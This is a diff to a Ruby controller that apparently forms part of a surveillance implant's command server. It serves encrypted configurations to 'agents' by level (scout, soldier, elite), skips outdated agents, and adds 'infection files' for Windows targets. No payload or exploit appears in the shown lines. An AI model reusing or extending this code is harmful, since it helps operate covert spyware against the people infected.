@@ -477,17 +477,13 @@ class AgentController < RESTController
     agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
     return not_found("Agent not found: #{@params['_id']}") if agent.nil?
 
+    # no config for scouts
+    return not_found if agent.level.eql? :scout
+
     # don't send the config to agent too old
-    if agent.platform == 'blackberry' or agent.platform == 'android'
-      if agent.version < 2012013101
-        trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
-        return not_found
-      end
-    else
-      if agent.version < 2012041601
-        trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
-        return not_found
-      end
+    if agent.version < 2012041601
+      trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
+      return not_found
     end
 
     case @request[:method]
@@ -503,8 +499,13 @@ class AgentController < RESTController
         agent.add_infection_files if agent.platform == 'windows'
 
         # encrypt the config for the agent using the confkey
-        enc_config = config.encrypted_config(agent[:confkey])
-        
+        case agent.level
+          when :elite
+            enc_config = config.encrypted_config(agent[:confkey])
+          when :soldier
+            enc_config = config.encrypted_soldier_config(agent[:confkey])
+        end
+
         return ok(enc_config, {content_type: 'binary/octet-stream'})
         
       when 'DELETE'
